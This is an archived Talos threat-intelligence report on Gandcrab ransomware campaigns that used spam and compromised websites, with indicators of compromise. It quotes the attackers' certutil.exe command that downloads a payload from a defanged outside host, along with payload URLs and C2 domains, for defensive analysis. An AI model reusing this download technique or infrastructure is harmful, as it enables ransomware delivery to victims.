{
    "id": "686b275b-ce4c-4ab5-b559-9b68a08b0f69",
    "created_at": "2023-01-12T15:04:41.483686Z",
    "updated_at": "2025-03-27T02:05:22.311363Z",
    "deleted_at": null,
    "sha1_hash": "2716bf7d115612495665a28203b2ffbaa534dec5",
    "title": "2018-05-09 - Gandcrab Ransomware Walks its Way onto Compromised Sites",
    "authors": "",
    "file_creation_date": "2022-05-27T21:31:37Z",
    "file_modification_date": "2022-05-27T21:31:37Z",
    "file_size": 1039345,
    "plain_text": "# Gandcrab Ransomware Walks its Way onto Compromised Sites\n\n**[blog.talosintelligence.com/2018/05/gandcrab-compromised-sites.html](https://blog.talosintelligence.com/2018/05/gandcrab-compromised-sites.html)**\n\n_[This blog post authored by Nick Biasini with contributions from Nick Lister and](https://twitter.com/infosec_nick)_ _Christopher_\n_Marczewski._\n\nDespite the recent decline in the prevalence of ransomware in the threat landscape, Cisco\nTalos has been monitoring the now widely distributed ransomware called Gandcrab.\nGandcrab uses both traditional spam campaigns, as well as multiple exploit kits, including\nRig and Grandsoft. While we've seen cryptocurrency miners overtake ransomware as the\nmost popular malware on the threat landscape, Gandcrab is proof that ransomware can still\nstrike at any time.\n\nWhile investigating a recent spam campaign Talos found a series of compromised websites\nthat were being used to deliver Gandcrab. This malware is the latest in a long line of\nexamples of why stopping malware distribution is a problem, and shows why securing\nwebsites is both an arduous and necessary task. As a clear example of how challenging\nresolving these issues can be, one of the sites — despite being shut down briefly — was\nseen serving Gandcrab not once, but twice, over a few days.\n\n## The first campaign\n\n\n-----\n\nBeginning on April 30, 2018, Talos began observing a large-scale spam campaign that\ndisguised itself as an online order. The subject used during this campaign was \"Your Order #\n{Random Digits}\" (i.e. Your Order #99627). A sample of the email can be seen below.\n\nYou can see above that there is a limited body and an attached ZIP file. The attached ZIP file\ncontains a Word document. This Word document contains a macro that downloads and\nexecutes the Gandcrab ransomware. In this particular instance, the malware was being\ndownloaded from the path below:\n\n**hxxp://185.189.58[.]222/bam.exe**\n\nDuring the course of the campaign, we also saw emails that included VBScript files instead\nof a ZIP file. The end result is the same, with the payload being pulled off of the server. One\nof the interesting aspects to this malware is the system tools used to download the payload.\nThere are lots of different ways that the payload can be downloaded using macros, but this\nparticular campaign used a somewhat novel approach of leveraging certutil.exe. Certutil.exe\nis a command line utility that is installed as part of Certificate Services. This campaign\nleveraged it to allow for the downloading of a malicious payload. The specific syntax used is\nshown below:\n\n**certutil.exe -urlcache -split -f hxxp://185.189.58[.]222/bam.exe**\n**C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\FVAacW.exe**\n\nThe -urlcache flag is designed to be used to display or delete URL-cached entries. However,\nby leveraging the -f and -split flags, the adversaries are able to force the URL to be\ndownloaded to the location shown above. We have seen this technique used periodically by\nattackers, but it isn't commonly utilized. The file is then executed, and Gandcrab is installed\non the target system.\n\n\n-----\n\n## Same campaign, different location\n\nA couple days after the initial wave of this campaign, a second one started up. Beginning on\nMay 2, Talos observed another wave of emails that were using an almost identical campaign.\nThe subjects, bodies, and attachments were almost identical. There was one subtle change:\nthe location the payload was being hosted. Initially, it appeared to be another random host as\nthe get request to retrieve the malware is shown below:\n\n**hxxp://172.104.40[.]92/js/kukul.exe**\n\nWe began investigating this a little further, and found when looking at DNS that this was in\nfact an actual legitimate website (www[.]pushpakcourier[.]net) and validated it by\nsuccessfully downloading the payload from hxxp://www[.]pushpakcourier[.]net/js/kukul.exe.\nThe website itself appears to be a courier company based out of India.\n\n\n-----\n\nWe were able to quickly determine that the website was running phpMyAdmin. We began\nlooking a little deeper at what possible vulnerabilities could exist, and we ran into a large\namount, including default credentials and multiple MySQL vulnerabilities that could be\nleveraged. Shortly after this was discovered, the website was taken down. Talos also\nattempted to directly reach out to the owners to help aid them in identifying where the threat\noriginated from and the scope of the downloads.\n\nThis incident helps shed more light onto one of the biggest challenges we face:\ncompromised websites. There are a huge amount of web pages available on the internet,\nand many of them are running on antiquated software. Most small businesses aren't aware\nthat a new vulnerability has been released against a web framework and even if they did,\nmost lack the expertise and time to be able to frequently update the software that the\ncompanies' websites rely upon.\n\nAdversaries, on the other hand, are able to quickly leverage these vulnerabilities and begin\nwidely scanning the internet looking for potential victims. Leveraging these compromised\nsites in these types of spam campaigns is increasingly effective because adversaries don't\nneed to maintain persistence, or do much of anything other than copying a file to a specific\nlocation that they can point to systems, allowing for infection.\n\n## Another day, more lazy spammers\n\nShortly after the previous two campaigns, we spotted a third — again using the same basic\nsubject, body and attachment types. This time, they ditched the IPs and started pulling the\nmalware from another likely compromised site using the domain this time.\n\n\n-----\n\n**hxxp://herbal-treatment-advisory[.]com/c.exe**\n\nThis particular site appears to be a Wordpress site, which has a plethora of vulnerabilities\nagainst it that could be leveraged. A little further digging revealed that they were running a\nversion of Wordpress that was more than a year out of date. Additionally, Talos found that\nthis particular site had been leveraged in the past to serve Gandcrab. This is yet another\nexample of how compromised websites will continue to be leveraged to serve malware. This\nallows adversaries to save time and money, doing things like registering domains, buying\nVPS, and configuring a web server to host the files. The added advantage is that they also\nget to leverage the web reputation of the site they compromise, which could help bypass\nsome blocklisting technologies, at least initially.\n\nIn both cases, these websites are using older versions of software and have publicly\nexposed the admin pages for the web frameworks they are utilizing. These are both common\nthings that website admins miss when they are setting up a small company site. Ensuring\nthat the administrative pages are protected and the software is patched is paramount to\npreventing adversaries from gaining access to serve malware.\n\n## Same site, different campaign\n\nOn May 5 and 7, Talos saw another set of spam campaigns launched using this same\ntemplate again. These particular spammers are not putting much effort into making the\ncampaigns unique. Over the course of several days, we repeatedly saw the same basic\nemail with the malware being hosted in different locations. These campaigns are no\nexception, except the websites aren't new. As shown below, the adversaries have returned to\n\n\n-----\n\nthe same sites they were leveraging just days earlier. This is despite the fact that the\nwebsites were taken down, likely due to malware being hosted.\n\n**hxxp://pushpakcourier[.]net/css/c.exe**\n**hxxp://herbal-treatment-advisory[.]com/c.exe**\n\nOver the course of a week, we saw four different spam campaigns leveraging compromised\nwebsites, and in some cases returning to the same sites, despite attempted cleaning. This is\na clear example of the challenges that face small businesses while trying to support a\nwebsite for their organizations. Adversaries are quick to identify both vulnerabilities and\nexposed admin pages to leverage to distribute malware around the world.\n\n## Payload\n\nGandcrab is one of the most widely distributed ransomware variants today. It is under almost\nconstant development, with its creators releasing new versions at an aggressive pace. Its\nbasic functionality has been well documented. It does the typical things ransomware does,\nincluding encrypting files with the .CRAB extension, changing the user's background, and\nleveraging Tor for communication.\n\nOne of the interesting elements of Gandcrab is its use of namecoin domains for command\nand control (C2) communication. These are easily identified by the .bit top level domain\n(TLD). Increasingly, adversaries rely on Tor and namecoin domains to help evade\nidentification. Namecoin is a decentralized DNS service that does not rely on a central\nauthority instead of relying on a peer-to-peer network. This increases the difficulty associated\nwith getting domains shut down and identifying those that are potentially behind them.\n\nNamecoin domains provide another example of why DNS should be locked down in\nenterprise environments. Since namecoin relies on blockchain to provide authoritative\nresponses, standard DNS servers are typically not effective at serving .bit domains. If an\nenterprise blocks all unauthorized DNS server access, most .bit domains will be blocked. We\nhave already started to see proxy services similar to tor2web start to emerge for .bit TLDs.\n\n## Conclusion\n\nWith billions of dollars at stakes in the ransomware field, threats like Gandcrab are going to\ncontinue to emerge time and time again. There are millions and millions of web pages\nrunning on platforms that have thousands of vulnerabilities. Since most of these pages are\ncreated and maintained by small organizations that don't have the knowledge or resources to\nreact to emerging vulnerabilities, this will continue to be a problem for the foreseeable future.\nAs long as adversaries are able to hide their malware on legitimate sites, web reputation\nsystems are going to be compromised.\n\n\n-----\n\nThe other thing we can learn from Gandcrab is that ransomware isn t going anywhere, even\nwith the rise in the popularity of cryptocurrency miners. Adversaries are always going to\nfollow money, whether its ransomware or malicious crypto miners, the bad guys are always\nlooking to make a quick dollar. Some of the biggest challenges we face as a security\ncommunity is the leveraging of compromised websites to distribute malware.\n\n## Coverage\n\nAdditional ways our customers can detect and block this threat are listed below.\n\n[Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the](https://www.cisco.com/c/en/us/products/security/advanced-malware-protection)\nmalware used by these threat actors.\n\n[CWS or](https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html) [WSA web scanning prevents access to malicious websites and detects malware](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\nused in these attacks.\n\n[Email Security can block malicious emails sent by threat actors as part of their campaign.](https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html)\n\n[Network Security appliances such as NGFW,](https://www.cisco.com/c/en/us/products/security/firewalls/index.html) [NGIPS, and](https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html) [Meraki MX can detect malicious](https://meraki.cisco.com/products/appliances)\nactivity associated with this threat.\n\n[AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security](https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html)\nproducts.\n\n[Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious](https://umbrella.cisco.com/)\ndomains, IPs, and URLs, whether users are on or off the corporate network.\n\nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase on Snort.org.](https://www.snort.org/products)\n\n## IOC\n\n\n-----\n\nEmail Subject:\nYour Order #{Random Digits}\n\nGandcrab Hashes:\n6a623b1e016fc0df94fe27a3eb9cc1128c5ee3831a7dcc8e4879427167a41501\n692c023850bbd95f116d5a623a5e0de9ad0ad13fadb3d89e584cc0aa5dc71f08\nad48c3770736588b17b4af2599704b5c86ff8ae6dadd30df59ea2b1ccc221f9c\n3486088d40d41b251017b4b6d21e742c78be820eaa8fe5d44eee79cf5974477e\n521fcb199a36d2c3b3bac40b025c2deac472f7f6f46c2eef253132e9f42ed95d\n9ba87c3c9ac737b5fd5fc0270f902fbe2eabbb1e0d0db64c3a07fea2eeeb5ba6\n27431cce6163d4456214baacbc9fd163d9e7e16348f41761bac13b65e3947aad\nce9c9917b66815ec7e5009f8bfa19ef3d2dfc0cf66be0b4b99b9bebb244d6706\n0b8618ea4aea0b213278a41436bde306a71ca9ba9bb9e6f0d33aca1c4373b3b5\n07adce515b7c2d6132713b32f0e28999e262832b47abc26ffc58297053f83257\n0f8ac8620229e7c64cf45470d637ea9bb7ae9d9f880777720389411b75cbdc2e\n812a7387e6728f462b213ff0f6ccc3c74aff8c258748e4635e1ddfa3b45927f0\nd25d1aba05f4a66a90811c31c6f4101267151e4ec49a7f393e53d87499d5ea7a\nee24d0d69b4e6c6ad479c886bb0536e60725bfa0becdafecadafc10e7a231a55\n\nC2 Domains:\nzonealarm[.]bit\nRansomware[.]bit\ngandcrab[.]bit\nCarder[.]bit\n\nCompromised Domains:\nHerbal-treatment-advisory[.]com\npushpakcourier[.]net\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-05-09 - Gandcrab Ransomware Walks its Way onto Compromised Sites.pdf"
    ],
    "report_names": [
        "2018-05-09 - Gandcrab Ransomware Walks its Way onto Compromised Sites.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535881,
    "ts_updated_at": 1743041122,
    "ts_creation_date": 1653687097,
    "ts_modification_date": 1653687097,
    "files": {
        "pdf": "https://archive.orkl.eu/2716bf7d115612495665a28203b2ffbaa534dec5.pdf",
        "text": "https://archive.orkl.eu/2716bf7d115612495665a28203b2ffbaa534dec5.txt",
        "img": "https://archive.orkl.eu/2716bf7d115612495665a28203b2ffbaa534dec5.jpg"
    }
}